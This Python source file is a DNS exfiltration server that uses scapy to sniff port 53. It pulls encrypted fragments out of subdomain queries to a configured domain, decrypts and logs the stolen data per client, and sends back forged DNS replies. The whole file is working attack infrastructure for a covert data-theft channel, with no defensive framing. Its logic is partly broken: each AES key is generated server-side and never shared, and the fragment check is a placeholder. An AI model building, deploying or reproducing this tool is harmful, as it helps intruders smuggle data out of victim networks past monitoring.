from scapy.all import *
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
from Crypto.Random import get_random_bytes
import threading
import base64
import os
import time

# Constants
PORT = 53
DOMAIN = "sub.brightbuys.me"  # Replace with your target domain
SAVE_PATH = "./logs"  # Directory to save client logs

# Dict to store client-specific data (AES keys, log file path, fragments)
clients = {}


# AES Encryption
def encrypt_aes(data, key, iv):
    cipher = AES.new(key, AES.MODE_CBC, iv)
    encrypted_data = cipher.encrypt(pad(data.encode('utf-8'), AES.block_size))
    return base64.b64encode(iv + encrypted_data).decode('utf-8')


# AES Decryption
def decrypt_aes(data, key):
    try:
        data = base64.b64decode(data)
        iv = data[:16]
        encrypted_message = data[16:]
        cipher = AES.new(key, AES.MODE_CBC, iv)
        decrypted_data = unpad(cipher.decrypt(encrypted_message), AES.block_size)
        return decrypted_data.decode('utf-8')
    except Exception as e:
        print(f"Decryption error: {e}")
        return None


# Function to log client data to a file
def log_client_data(client_ip, data):
    timestamp = time.strftime("%Y%m%d-%H%M%S")
    log_file = clients[client_ip]['log_file']

    with open(log_file, 'a') as f:
        f.write(f"[{timestamp}] {client_ip}: {data}\n")


# Function to create a new client entry (AES key and log file)
def create_new_client(client_ip):
    aes_key = get_random_bytes(32)  # Generate a unique AES key for the client
    log_file = os.path.join(SAVE_PATH, f"{client_ip}.log")  # Create a log file for the client

    clients[client_ip] = {
        'aes_key': aes_key,
        'log_file': log_file,
        'fragments': []  # Initialize empty fragment list for this client
    }

    print(f"New client detected: {client_ip}. AES key generated and log file created: {log_file}")


# Function to check if all fragments are received (simple length check)
def is_full_message_received(fragments):
    # Implement your logic to check whether all fragments have been received
    # Here we assume a fixed number of fragments for simplicity
    return len(fragments) > 1  # Replace with real logic as needed


# Function to handle DNS response based on the query type
def forge_dns_response(pkt, rdata="", rcode=0):
    d = pkt[IP].src
    dp = pkt[UDP].sport
    id = pkt[DNS].id
    q = pkt[DNS].qd
    reply = IP(dst=d) / UDP(dport=dp) / DNS(id=id, qr=1, rd=1, ra=1, rcode=rcode, qd=q)

    # Handle different DNS query types (e.g., A, NS, TXT)
    qtype = pkt[DNSQR].qtype
    if qtype == 1:  # A record
        reply.an = DNSRR(rrname=pkt[DNSQR].qname, type='A', ttl=60, rdata=rdata or "127.0.0.1")
    elif qtype == 2:  # NS record
        reply.an = DNSRR(rrname=pkt[DNSQR].qname, type='NS', ttl=3600, rdata=f"ns.{DOMAIN}")
    elif qtype == 16:  # TXT record
        reply.an = DNSRR(rrname=pkt[DNSQR].qname, type='TXT', ttl=60, rdata=rdata or "example response")
    else:
        reply.rcode = 3  # NXDOMAIN for unsupported query types

    send(reply, verbose=0)


# DNS Packet handler for processing client queries
def handle_dns_packet(packet):
    if packet.haslayer(DNS) and packet[DNS].opcode == 0:  # DNS query
        print(f"packet: {packet}")
        domain = packet[DNSQR].qname.decode().lower()
        
        print(f"domain: {domain}")

        # Check if the labels are too long (DNS label limit is 63 characters)
        labels = domain.split('.')
        for label in labels:
            if len(label) > 63:
                print(f"Error: DNS label too long in {domain}")
                return  # Skip further processing of this packet

        client_ip = packet[IP].src

        # If client is new, generate a new AES key and log file
        if client_ip not in clients:
            create_new_client(client_ip)

        aes_key = clients[client_ip]['aes_key']

        if DOMAIN in domain:
            encrypted_fragment = domain.replace(f"{DOMAIN}", "")
            
            print(f"fragment: {encrypted_fragment}")
            # Store fragments until the full message is received
            clients[client_ip]['fragments'].append(encrypted_fragment)

            # Assume some condition to check if all fragments have been received
            if is_full_message_received(clients[client_ip]['fragments']):
                full_message = ''.join(clients[client_ip]['fragments'])
                decrypted_data = decrypt_aes(full_message, aes_key)
                if decrypted_data:
                    print(f"Exfiltrated data from {client_ip} (decrypted): {decrypted_data}")
                    log_client_data(client_ip, decrypted_data)

                    response_data = f"Received: {decrypted_data}"
                    encrypted_response = encrypt_aes(response_data, aes_key, get_random_bytes(16))
                    forge_dns_response(packet, rdata=encrypted_response)

                clients[client_ip]['fragments'] = []  # Clear fragments after processing
            else:
                print(f"Waiting for more fragments from {client_ip}")
        else:
            print(f"Unrelated DNS request from {client_ip}: {domain}")


# Start DNS packet listener in a separate thread
def start_listener():
    sniff(filter=f"udp port {PORT}", prn=handle_dns_packet)


# Main function to start the multi-threaded DNS server
if __name__ == "__main__":
    # Create the log directory if it doesn't exist
    os.makedirs(SAVE_PATH, exist_ok=True)

    print("Starting DNS exfiltration server...")

    # Start multi-threaded DNS packet listener
    listener_thread = threading.Thread(target=start_listener)
    listener_thread.daemon = True  # Run in the background
    listener_thread.start()

    # Main thread continues, allowing for other operations (e.g., user commands)
    while True:
        command = input("Enter 'quit' to stop the server: ")
        if command == 'quit':
            break

    print("Stopping the DNS exfiltration server...")
